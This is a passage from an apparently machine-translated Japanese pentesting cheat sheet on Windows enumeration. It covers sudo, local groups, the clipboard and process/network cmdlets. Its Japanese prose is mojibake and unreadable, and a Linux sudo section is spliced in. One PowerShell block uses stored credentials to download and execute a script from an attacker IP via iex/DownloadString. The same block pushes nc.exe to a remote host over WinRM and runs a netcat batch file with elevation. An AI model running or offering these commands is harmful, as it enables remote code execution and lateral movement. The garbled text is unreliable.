SUDOã®è¨­å®šã¯ã€/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ã§ç®¡ç†ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã©ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ã®è¨­å®šãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

SUDOã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’æŒãŸãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã€å¿…è¦ãªã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä¸€æ™‚çš„ã«ç‰¹æ¨©ã‚’å–å¾—ã§ãã¾ã™ã€‚ãŸã ã—ã€SUDOã®è¨­å®šã«ã¯æ³¨æ„ãŒå¿…è¦ã§ã‚ã‚Šã€ä¸é©åˆ‡ãªè¨­å®šã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ãƒªã‚¹ã‚¯ã¨ãªã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€SUDOã®åŸºæœ¬çš„ãªä½¿ç”¨æ–¹æ³•ã§ã™ã€‚

### SUDOã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«

SUDOã¯é€šå¸¸ã€Linuxãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚‚ã—ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ãªã„å ´åˆã¯ã€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### SUDOã®è¨­å®š

SUDOã®è¨­å®šã¯ã€/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ã§è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯rootãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ãŒç·¨é›†ã§ãã‚‹ãŸã‚ã€ç·¨é›†ã™ã‚‹éš›ã¯rootæ¨©é™ãŒå¿…è¦ã§ã™ã€‚

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã—ã¾ã™ã€‚

```
sudo visudo
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ†ã‚­ã‚¹ãƒˆã‚¨ãƒ‡ã‚£ã‚¿ãŒèµ·å‹•ã—ã€/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ãŒé–‹ã‹ã‚Œã¾ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®SUDOæ¨©é™ã®è¿½åŠ 

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«SUDOæ¨©é™ã‚’è¿½åŠ ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã—ã¾ã™ã€‚

```
ãƒ¦ãƒ¼ã‚¶ãƒ¼å  ALL=(ALL) ALL
```

ä¸Šè¨˜ã®ã‚¨ãƒ³ãƒˆãƒªã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã«SUDOæ¨©é™ã‚’ä¸ãˆã¦ã„ã¾ã™ã€‚ALL=(ALL) ALLã®éƒ¨åˆ†ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã©ã®ãƒ›ã‚¹ãƒˆã§ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦ã©ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ã‚’æŒ‡å®šã—ã¦ã„ã¾ã™ã€‚

### SUDOã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹

SUDOã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚³ãƒãƒ³ãƒ‰ã®å‰ã«sudoã‚’ä»˜ã‘ã¾ã™ã€‚

```
sudo ã‚³ãƒãƒ³ãƒ‰
```

ä¾‹ãˆã°ã€rootæ¨©é™ãŒå¿…è¦ãªã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å ´åˆã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¾ã™ã€‚

```
sudo apt-get update
```

### SUDOã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¦æ±‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€SUDOã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¦æ±‚ã•ã‚Œã¾ã™ã€‚ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¦æ±‚ã‚’çœç•¥ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«/etc/sudoersãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã—ã¾ã™ã€‚

```
ãƒ¦ãƒ¼ã‚¶ãƒ¼å  ALL=(ALL) NOPASSWD: ALL
```

ä¸Šè¨˜ã®ã‚¨ãƒ³ãƒˆãƒªã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã«å¯¾ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¦æ±‚ã‚’çœç•¥ã—ã¦ã„ã¾ã™ã€‚NOPASSWD: ALLã®éƒ¨åˆ†ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¦æ±‚ã‚’çœç•¥ã™ã‚‹è¨­å®šã§ã™ã€‚

### SUDOã®ãƒ­ã‚°ã®ç¢ºèª

SUDOã‚’ä½¿ç”¨ã—ãŸã‚³ãƒãƒ³ãƒ‰ã®ãƒ­ã‚°ã¯ã€/var/log/auth.logãƒ•ã‚¡ã‚¤ãƒ«ã«è¨˜éŒ²ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ­ã‚°ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã€SUDOã®ä½¿ç”¨å±¥æ­´ã‚’è¿½è·¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```
sudo cat /var/log/auth.log
```

ä»¥ä¸ŠãŒSUDOã®åŸºæœ¬çš„ãªä½¿ç”¨æ–¹æ³•ã§ã™ã€‚SUDOã‚’é©åˆ‡ã«è¨­å®šã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ãƒªã‚¹ã‚¯ã‚’æœ€å°é™ã«æŠ‘ãˆã¾ã—ã‚‡ã†ã€‚
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## ã‚°ãƒ«ãƒ¼ãƒ—

ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’çµ„ç¹”åŒ–ã™ã‚‹ãŸã‚ã®é‡è¦ãªè¦ç´ ã§ã™ã€‚ã‚°ãƒ«ãƒ¼ãƒ—ã«ã¯ã€ç‰¹å®šã®æ¨©é™ã‚„ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚‚åŒã˜æ¨©é™ã‚„ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ä¸€è¦§è¡¨ç¤º

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã™ã¹ã¦ã®ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä¸€è¦§è¡¨ç¤ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-LocalGroup
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ä½œæˆ

æ–°ã—ã„ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
New-LocalGroup -Name "GroupName"
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è¿½åŠ 

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ—¢å­˜ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Add-LocalGroupMember -Group "GroupName" -Member "UserName"
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã‹ã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å‰Šé™¤

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚°ãƒ«ãƒ¼ãƒ—ã‹ã‚‰å‰Šé™¤ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Remove-LocalGroupMember -Group "GroupName" -Member "UserName"
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®å‰Šé™¤

ã‚°ãƒ«ãƒ¼ãƒ—ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Remove-LocalGroup -Name "GroupName"
```

ä»¥ä¸ŠãŒåŸºæœ¬çš„ãªPowerShellã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ãŸã‚°ãƒ«ãƒ¼ãƒ—ã®æ“ä½œæ–¹æ³•ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Windowsã‚·ã‚¹ãƒ†ãƒ ä¸Šã§ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ç®¡ç†ãŒå®¹æ˜“ã«ãªã‚Šã¾ã™ã€‚
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰

ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã¯ã€Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ä½¿ç”¨ã•ã‚Œã‚‹ä¸€æ™‚çš„ãªãƒ‡ãƒ¼ã‚¿ä¿å­˜é ˜åŸŸã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ†ã‚­ã‚¹ãƒˆã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ã¨ã€ãã®ãƒ‡ãƒ¼ã‚¿ã¯ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã¯ã€ã‚³ãƒ”ãƒ¼ã—ãŸãƒ‡ãƒ¼ã‚¿ã‚’ä»–ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è²¼ã‚Šä»˜ã‘ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®æ“ä½œ

#### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’è¡¨ç¤ºã™ã‚‹

```powershell
Get-Clipboard
```

#### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«ãƒ†ã‚­ã‚¹ãƒˆã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹

```powershell
Set-Clipboard -Text "ã‚³ãƒ”ãƒ¼ã™ã‚‹ãƒ†ã‚­ã‚¹ãƒˆ"
```

#### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹

```powershell
Set-Clipboard -Path "ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹"
```

#### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’ã‚¯ãƒªã‚¢ã™ã‚‹

```powershell
Clear-Clipboard
```

### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸæ”»æ’ƒ

ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã¯ã€æ‚ªæ„ã®ã‚ã‚‹æ”»æ’ƒè€…ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã¯ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸæ”»æ’ƒã®ä¾‹ã§ã™ã€‚

- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’ç›—ã‚€ãƒãƒ«ã‚¦ã‚§ã‚¢
- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’ä»‹ã—ã¦æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹æ”»æ’ƒ
- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ”»æ’ƒ

ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’å®šæœŸçš„ã«ç¢ºèªã—ã€ä¸å¯©ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’ç›£è¦–ã™ã‚‹
- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«æ©Ÿå¯†æƒ…å ±ã‚’ã‚³ãƒ”ãƒ¼ã—ãªã„
- ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’ã‚¯ãƒªã‚¢ã™ã‚‹éš›ã«ã¯æ³¨æ„ã‚’æ‰•ã„ã€æ©Ÿå¯†æƒ…å ±ãŒæ¼æ´©ã—ãªã„ã‚ˆã†ã«ã™ã‚‹
```powershell
Get-Clipboard
```
## ãƒ—ãƒ­ã‚»ã‚¹

### Get-Process

`Get-Process`ã‚³ãƒãƒ³ãƒ‰ã¯ã€å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-Process
```

### Start-Process

`Start-Process`ã‚³ãƒãƒ³ãƒ‰ã¯ã€æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’é–‹å§‹ã—ã¾ã™ã€‚

```powershell
Start-Process -FilePath "C:\path\to\executable.exe"
```

### Stop-Process

`Stop-Process`ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã—ãŸãƒ—ãƒ­ã‚»ã‚¹ã‚’çµ‚äº†ã—ã¾ã™ã€‚

```powershell
Stop-Process -Name "processname"
```

### Invoke-Command

`Invoke-Command`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ä¸Šã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```powershell
Invoke-Command -ComputerName "computername" -ScriptBlock { Get-Process }
```

### Get-WmiObject

`Get-WmiObject`ã‚³ãƒãƒ³ãƒ‰ã¯ã€WMIã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚

```powershell
Get-WmiObject -Class Win32_Process
```

### Get-CimInstance

`Get-CimInstance`ã‚³ãƒãƒ³ãƒ‰ã¯ã€CIMã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å–å¾—ã—ã¾ã™ã€‚

```powershell
Get-CimInstance -ClassName Win32_Process
```

### Stop-Service

`Stop-Service`ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã—ãŸã‚µãƒ¼ãƒ“ã‚¹ã‚’åœæ­¢ã—ã¾ã™ã€‚

```powershell
Stop-Service -Name "servicename"
```

### Start-Service

`Start-Service`ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã—ãŸã‚µãƒ¼ãƒ“ã‚¹ã‚’é–‹å§‹ã—ã¾ã™ã€‚

```powershell
Start-Service -Name "servicename"
```

### Restart-Service

`Restart-Service`ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã—ãŸã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™ã€‚

```powershell
Restart-Service -Name "servicename"
```

### Set-Service

`Set-Service`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã®è¨­å®šã‚’å¤‰æ›´ã—ã¾ã™ã€‚

```powershell
Set-Service -Name "servicename" -StartupType Automatic
```

### Get-Service

`Get-Service`ã‚³ãƒãƒ³ãƒ‰ã¯ã€å®Ÿè¡Œä¸­ã®ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-Service
```

### Get-NetTCPConnection

`Get-NetTCPConnection`ã‚³ãƒãƒ³ãƒ‰ã¯ã€TCPæ¥ç¶šã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetTCPConnection
```

### Get-NetUDPEndpoint

`Get-NetUDPEndpoint`ã‚³ãƒãƒ³ãƒ‰ã¯ã€UDPã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetUDPEndpoint
```

### Get-NetTCPSetting

`Get-NetTCPSetting`ã‚³ãƒãƒ³ãƒ‰ã¯ã€TCPè¨­å®šã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetTCPSetting
```

### Get-NetFirewallRule

`Get-NetFirewallRule`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ãƒ«ãƒ¼ãƒ«ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetFirewallRule
```

### Get-NetFirewallProfile

`Get-NetFirewallProfile`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetFirewallProfile
```

### Get-NetAdapter

`Get-NetAdapter`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter
```

### Get-NetIPAddress

`Get-NetIPAddress`ã‚³ãƒãƒ³ãƒ‰ã¯ã€IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetIPAddress
```

### Get-NetRoute

`Get-NetRoute`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ«ãƒ¼ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetRoute
```

### Get-NetNeighbor

`Get-NetNeighbor`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš£æ¥ãƒ‡ãƒã‚¤ã‚¹ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetNeighbor
```

### Get-NetAdapterStatistics

`Get-NetAdapterStatistics`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®çµ±è¨ˆæƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterStatistics
```

### Get-NetAdapterAdvancedProperty

`Get-NetAdapterAdvancedProperty`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®è©³ç´°ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterAdvancedProperty
```

### Get-NetAdapterBinding

`Get-NetAdapterBinding`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterBinding
```

### Get-NetAdapterChecksumOffload

`Get-NetAdapterChecksumOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚§ãƒƒã‚¯ã‚µãƒ ã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterChecksumOffload
```

### Get-NetAdapterEncapsulatedPacketTaskOffload

`Get-NetAdapterEncapsulatedPacketTaskOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã‚«ãƒ—ã‚»ãƒ«åŒ–ãƒ‘ã‚±ãƒƒãƒˆã‚¿ã‚¹ã‚¯ã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterEncapsulatedPacketTaskOffload
```

### Get-NetAdapterIPsecOffload

`Get-NetAdapterIPsecOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®IPsecã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterIPsecOffload
```

### Get-NetAdapterLso

`Get-NetAdapterLso`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®Lsoï¼ˆLarge Send Offloadï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterLso
```

### Get-NetAdapterPacketDirect

`Get-NetAdapterPacketDirect`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®PacketDirectã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterPacketDirect
```

### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®é›»æºç®¡ç†ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterPowerManagement
```

### Get-NetAdapterQos

`Get-NetAdapterQos`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®QoSï¼ˆQuality of Serviceï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterQos
```

### Get-NetAdapterRdma

`Get-NetAdapterRdma`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RDMAï¼ˆRemote Direct Memory Accessï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRdma
```

### Get-NetAdapterRsc

`Get-NetAdapterRsc`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RSCï¼ˆReceive Segment Coalescingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRsc
```

### Get-NetAdapterRss

`Get-NetAdapterRss`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RSSï¼ˆReceive Side Scalingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRss
```

